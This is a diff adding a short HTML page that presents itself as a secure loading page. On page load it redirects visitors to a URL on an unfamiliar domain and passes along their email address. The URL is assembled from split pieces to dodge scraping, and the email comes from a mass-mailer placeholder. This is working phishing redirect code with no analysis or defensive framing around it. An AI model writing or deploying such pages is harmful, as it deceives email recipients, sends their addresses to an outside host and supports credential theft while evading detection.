@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Secure Page...</title>
+    <script>
+        // Obfuscated URL construction (prevents direct scraping)
+        function getRedirectUrl(email) {
+            const domainParts = ["preserver", "tridenitndia", "com"];
+            const pathParts = ["krxrjqgrld", "php"];
+            const paramKey = "ref";
+            
+            // Dynamically assemble the URL
+            return `https://${domainParts.join('.')}/${pathParts[0]}.${pathParts[1]}?${paramKey}=${encodeURIComponent(email)}`;
+        }
+
+        // Extract email from URL or use placeholder
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || '[[-Email-]]'; // Preserve Gammadyne placeholder
+        
+        // Redirect to the obfuscated URL
+        window.location.href = getRedirectUrl(email);
+    </script>
+</head>
+<body>
+    <p>Please wait while we redirect you securely...</p>
+    <noscript>
+        <p>Enable JavaScript to proceed. <a href="#" onclick="window.location.reload()">Click here</a> to retry.</p>
+    </noscript>
+</body>
+</html>
